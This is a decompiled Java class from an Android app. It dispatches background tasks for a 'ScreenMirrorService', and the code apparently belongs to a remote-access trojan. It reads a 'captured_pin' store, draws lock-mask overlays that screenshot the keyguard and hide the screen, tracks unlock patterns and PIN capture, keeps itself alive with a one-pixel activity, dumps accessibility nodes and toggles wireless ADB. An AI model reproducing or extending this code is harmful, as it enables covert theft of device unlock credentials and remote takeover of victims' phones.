// Decompiled with JADX from the REA-supplied audited engine JAR; not original source.
package w1;

import android.os.Build;
import android.os.Handler;
import android.os.Looper;
import android.os.SystemClock;
import android.util.Log;
import java.util.concurrent.Executor;
import java.util.concurrent.atomic.AtomicBoolean;
import lyr.stable.runtime.MirrorOnePixelActivity;
import lyr.stable.runtime.ScreenMirrorService;

/* JADX INFO: compiled from: r8-map-id-5347474c40041fa035618ae5fd6f249b536e43095feee62dfa1b0bceecef7771 */
/* JADX INFO: loaded from: classes.dex */
public final /* synthetic */ class pa implements Runnable {

    /* JADX INFO: renamed from: c, reason: collision with root package name */
    public final /* synthetic */ int f4862c;

    /* JADX INFO: renamed from: d, reason: collision with root package name */
    public final /* synthetic */ ScreenMirrorService f4863d;

    public /* synthetic */ pa(ScreenMirrorService screenMirrorService, int i3) {
        this.f4862c = i3;
        this.f4863d = screenMirrorService;
    }

    private final void a() {
        ScreenMirrorService screenMirrorService = this.f4863d;
        synchronized (screenMirrorService.K2) {
            screenMirrorService.g3 = Long.MAX_VALUE;
        }
        try {
            if (!screenMirrorService.f2537s.get()) {
                screenMirrorService.x6();
            } else {
                screenMirrorService.o5();
                screenMirrorService.x6();
            }
        } catch (Throwable th) {
            try {
                Log.w("ScreenMirror", "nodeDumpTick: " + th.getMessage());
            } finally {
                screenMirrorService.x6();
            }
        }
    }

    private final void b() {
        ScreenMirrorService screenMirrorService = this.f4863d;
        rd rdVar = ScreenMirrorService.n6;
        a2.c.c(screenMirrorService);
        g2.e eVar = screenMirrorService.f2530p2;
        synchronized (eVar) {
            eVar.f1584a = 0L;
            eVar.f1585b = 0L;
            eVar.f1586c = 0L;
            eVar.f1587d = 0L;
        }
        boolean zW3 = screenMirrorService.W3();
        boolean zJ3 = screenMirrorService.J3();
        boolean z2 = screenMirrorService.E1;
        boolean z3 = screenMirrorService.O1;
        int size = screenMirrorService.f2557x1.size();
        if ((zW3 && zJ3) || z3 || z2 || size > 0) {
            Log.i("ScreenMirror", "[Unlock] SCREEN_OFF hold pattern overlay locked=" + screenMirrorService.J3() + " dots=" + screenMirrorService.f2557x1.size() + " frozen=" + screenMirrorService.O1);
        } else {
            screenMirrorService.G1 = false;
            screenMirrorService.Q1 = null;
            screenMirrorService.R1 = null;
            screenMirrorService.S1 = null;
            screenMirrorService.T1 = null;
            screenMirrorService.J1 = false;
            screenMirrorService.K1 = false;
            a1.d dVar = screenMirrorService.P1;
            int i3 = 0;
            while (true) {
                l8[] l8VarArr = (l8[]) dVar.f42d;
                if (i3 >= l8VarArr.length) {
                    break;
                }
                l8VarArr[i3] = null;
                i3++;
            }
            dVar.f41c = false;
            screenMirrorService.Q0();
            screenMirrorService.j0();
            screenMirrorService.E1 = false;
            screenMirrorService.U1 = 0L;
        }
        if (Looper.myLooper() == Looper.getMainLooper()) {
            screenMirrorService.O0();
        } else {
            screenMirrorService.f2475a2.post(new pa(screenMirrorService, 5));
        }
        screenMirrorService.G5();
        synchronized (screenMirrorService.C0) {
            screenMirrorService.D0 = false;
        }
        try {
            screenMirrorService.W0.b();
        } catch (Throwable th) {
            a0.a.p(th, new StringBuilder("[U1] screen_off flush fail: "), "ScreenMirror");
        }
        if (screenMirrorService.n1 && !screenMirrorService.U0.k()) {
            screenMirrorService.U0.d();
        }
        if (screenMirrorService.U0.z() != null) {
            x xVar = screenMirrorService.G2;
            if (xVar == null || !xVar.E(screenMirrorService.d1)) {
                screenMirrorService.Q1("screen_off");
            } else {
                Log.i("ScreenMirror", "[PinFusion] screen_off finalize queued behind pipeline");
            }
        } else {
            screenMirrorService.N5(screenMirrorService.d1);
            screenMirrorService.n0();
        }
        if (!screenMirrorService.J3()) {
            screenMirrorService.g0();
        }
        c2.p.x(screenMirrorService, "screen_off");
        Handler handler = s8.f5059a;
        c2.c.e(screenMirrorService, "screen_off", true);
        MirrorOnePixelActivity.a(screenMirrorService);
        screenMirrorService.f2509j2.f2301c = "";
        screenMirrorService.s7();
    }

    @Override // java.lang.Runnable
    public final void run() {
        d0.d dVarG;
        e2.a0 a0Var;
        e2.a0 a0Var2;
        boolean zEquals = false;
        switch (this.f4862c) {
            case 0:
                ScreenMirrorService screenMirrorService = this.f4863d;
                rd rdVar = ScreenMirrorService.n6;
                screenMirrorService.c6();
                return;
            case 1:
                ScreenMirrorService.b(this.f4863d);
                return;
            case 2:
                ScreenMirrorService screenMirrorService2 = this.f4863d;
                if (screenMirrorService2.Y1 != null || !screenMirrorService2.getSharedPreferences("captured_pin", 0).getBoolean("lock_mask_active", false) || !screenMirrorService2.G0) {
                    return;
                }
                int i3 = screenMirrorService2.getSharedPreferences("captured_pin", 0).getInt("lock_mask_mode", 0);
                Handler handler = screenMirrorService2.f2475a2;
                if (screenMirrorService2.Y1 != null) {
                    return;
                }
                String str = Build.MANUFACTURER;
                if (str != null && !str.isEmpty()) {
                    String lowerCase = str.trim().toLowerCase();
                    if (lowerCase.contains("xiaomi") || lowerCase.contains("redmi") || lowerCase.contains("poco")) {
                        Log.i("ScreenMirror", "[LockMask] skip keyguard screenshot on ".concat(str));
                        screenMirrorService2.L6(i3);
                        return;
                    }
                }
                x7 x7Var = ScreenMirrorService.o6;
                synchronized (x7Var) {
                    dVarG = x7Var.g(false);
                }
                p5 p5Var = (p5) dVarG.f532b;
                if (p5Var == null) {
                    Log.i("ScreenMirror", "[LockMask] shared screenshot slot busy; use fallback background");
                    screenMirrorService2.L6(i3);
                    return;
                }
                AtomicBoolean atomicBoolean = new AtomicBoolean(true);
                ja jaVar = new ja(screenMirrorService2, atomicBoolean, p5Var, i3, 1);
                handler.postDelayed(jaVar, 6000L);
                try {
                    Executor mainExecutor = screenMirrorService2.getMainExecutor();
                    try {
                        qc qcVar = new qc(screenMirrorService2, jaVar, atomicBoolean, p5Var, i3);
                        jaVar = jaVar;
                        atomicBoolean = atomicBoolean;
                        p5Var = p5Var;
                        i3 = i3;
                        screenMirrorService2.takeScreenshot(0, mainExecutor, qcVar);
                        return;
                    } catch (Throwable th) {
                        th = th;
                        jaVar = jaVar;
                        atomicBoolean = atomicBoolean;
                        p5Var = p5Var;
                        i3 = i3;
                        handler.removeCallbacks(jaVar);
                        atomicBoolean.compareAndSet(true, false);
                        p5Var.b();
                        Log.w("ScreenMirror", "[LockMask] background screenshot exception: " + th.getMessage());
                        screenMirrorService2.L6(i3);
                        return;
                    }
                } catch (Throwable th2) {
                    th = th2;
                }
                break;
            case 3:
                ScreenMirrorService screenMirrorService3 = this.f4863d;
                synchronized (screenMirrorService3.f2543u) {
                    if (!screenMirrorService3.X && !screenMirrorService3.Y) {
                        e2.s1 s1Var = screenMirrorService3.a4;
                        if (s1Var != null) {
                            synchronized (s1Var) {
                                try {
                                    a0Var = null;
                                    if (!s1Var.f997k && s1Var.f990d != e2.q1.f931d && ((a0Var2 = s1Var.f992f) != null || (s1Var.f991e != null && s1Var.f994h != 0))) {
                                        long j3 = s1Var.f995i;
                                        if (j3 >= Long.MAX_VALUE) {
                                            throw new IllegalStateException("post-control serial exhausted");
                                        }
                                        s1Var.f995i = j3 + 1;
                                        s1Var.f996j = s1Var.f989c;
                                        a0Var = a0Var2;
                                    }
                                } catch (Throwable th3) {
                                    throw th3;
                                }
                            }
                            if (a0Var == null) {
                                return;
                            }
                            try {
                                synchronized (a0Var.f707f) {
                                    if (a0Var.f704c.get()) {
                                        return;
                                    }
                                    a0Var.a();
                                    return;
                                }
                            } catch (Throwable unused) {
                                return;
                            }
                        }
                        return;
                    }
                    return;
                }
            case 4:
                ScreenMirrorService screenMirrorService4 = this.f4863d;
                rd rdVar2 = ScreenMirrorService.n6;
                screenMirrorService4.P6();
                return;
            case 5:
                ScreenMirrorService screenMirrorService5 = this.f4863d;
                rd rdVar3 = ScreenMirrorService.n6;
                screenMirrorService5.O0();
                return;
            case 6:
                ScreenMirrorService screenMirrorService6 = this.f4863d;
                rd rdVar4 = ScreenMirrorService.n6;
                screenMirrorService6.V6();
                return;
            case 7:
                ScreenMirrorService screenMirrorService7 = this.f4863d;
                rd rdVar5 = ScreenMirrorService.n6;
                screenMirrorService7.B7();
                return;
            case 8:
                ScreenMirrorService screenMirrorService8 = this.f4863d;
                screenMirrorService8.F1 = false;
                if (!screenMirrorService8.J3() || screenMirrorService8.f2534q2) {
                    return;
                }
                if (screenMirrorService8.H1 || screenMirrorService8.I1 || screenMirrorService8.E1) {
                    screenMirrorService8.q6();
                    screenMirrorService8.z6();
                    return;
                }
                return;
            case 9:
                ScreenMirrorService screenMirrorService9 = this.f4863d;
                rd rdVar6 = ScreenMirrorService.n6;
                screenMirrorService9.U0();
                try {
                    zEquals = o4.f4708a.equals(screenMirrorService9.k5()[0]);
                    break;
                } catch (Throwable unused2) {
                }
                if (zEquals) {
                    return;
                }
                screenMirrorService9.S4();
                return;
            case 10:
                ScreenMirrorService screenMirrorService10 = this.f4863d;
                rd rdVar7 = ScreenMirrorService.n6;
                if (screenMirrorService10.b1(new pa(screenMirrorService10, 10))) {
                    return;
                }
                screenMirrorService10.Q4 = "projection";
                screenMirrorService10.v6(2);
                return;
            case 11:
                ScreenMirrorService screenMirrorService11 = this.f4863d;
                rd rdVar8 = ScreenMirrorService.n6;
                new Handler(Looper.getMainLooper()).post(new pa(screenMirrorService11, 12));
                return;
            case 12:
                ScreenMirrorService screenMirrorService12 = this.f4863d;
                rd rdVar9 = ScreenMirrorService.n6;
                if (!t8.f5164a.get() || screenMirrorService12.M5 == null) {
                    return;
                }
                x1.r rVar = screenMirrorService12.M5;
                if (rVar.b()) {
                    l6.d("permission_event", 1, new v8(15, rVar));
                    return;
                } else {
                    l6.a("permission_event");
                    return;
                }
            case 13:
                ScreenMirrorService screenMirrorService13 = this.f4863d;
                Handler handler2 = screenMirrorService13.f2510k;
                ic icVar = screenMirrorService13.f2535r;
                handler2.removeCallbacks(icVar);
                screenMirrorService13.f2531q = SystemClock.uptimeMillis() + 120;
                handler2.postDelayed(icVar, 16L);
                return;
            case 14:
                ScreenMirrorService screenMirrorService14 = this.f4863d;
                rd rdVar10 = ScreenMirrorService.n6;
                screenMirrorService14.O5();
                return;
            case 15:
                ScreenMirrorService screenMirrorService15 = this.f4863d;
                rd rdVar11 = ScreenMirrorService.n6;
                screenMirrorService15.i7();
                return;
            case 16:
                ScreenMirrorService screenMirrorService16 = this.f4863d;
                screenMirrorService16.T5.b();
                screenMirrorService16.q1();
                return;
            case 17:
                ScreenMirrorService screenMirrorService17 = this.f4863d;
                if (screenMirrorService17.f2534q2) {
                    return;
                }
                screenMirrorService17.l6 = 1;
                return;
            case 18:
                ScreenMirrorService screenMirrorService18 = this.f4863d;
                rd rdVar12 = ScreenMirrorService.n6;
                screenMirrorService18.j7();
                return;
            case 19:
                ScreenMirrorService screenMirrorService19 = this.f4863d;
                if (!screenMirrorService19.K0 || screenMirrorService19.X || screenMirrorService19.Y) {
                    return;
                }
                int i4 = screenMirrorService19.P0 + 1;
                screenMirrorService19.P0 = i4;
                if (screenMirrorService19.z("retry_" + i4) || i4 >= 2) {
                    return;
                }
                screenMirrorService19.J0.postDelayed(screenMirrorService19.Q0, 120L);
                return;
            case 20:
                ScreenMirrorService screenMirrorService20 = this.f4863d;
                rd rdVar13 = ScreenMirrorService.n6;
                screenMirrorService20.R1();
                return;
            case 21:
                a();
                return;
            case 22:
                ScreenMirrorService screenMirrorService21 = this.f4863d;
                rd rdVar14 = ScreenMirrorService.n6;
                screenMirrorService21.x4();
                return;
            case 23:
                ScreenMirrorService screenMirrorService22 = this.f4863d;
                rd rdVar15 = ScreenMirrorService.n6;
                screenMirrorService22.x4();
                return;
            case 24:
                b();
                return;
            case 25:
                ScreenMirrorService screenMirrorService23 = this.f4863d;
                rd rdVar16 = ScreenMirrorService.n6;
                screenMirrorService23.m4();
                return;
            case 26:
                n.w0(this.f4863d, "wireless_adb", false);
                return;
            case 27:
                wf.X(this.f4863d, "service_interrupted");
                wf.c0();
                return;
            case 28:
                wf.O(this.f4863d);
                return;
            default:
                wf.X(this.f4863d, "service_connected");
                return;
        }
    }
}
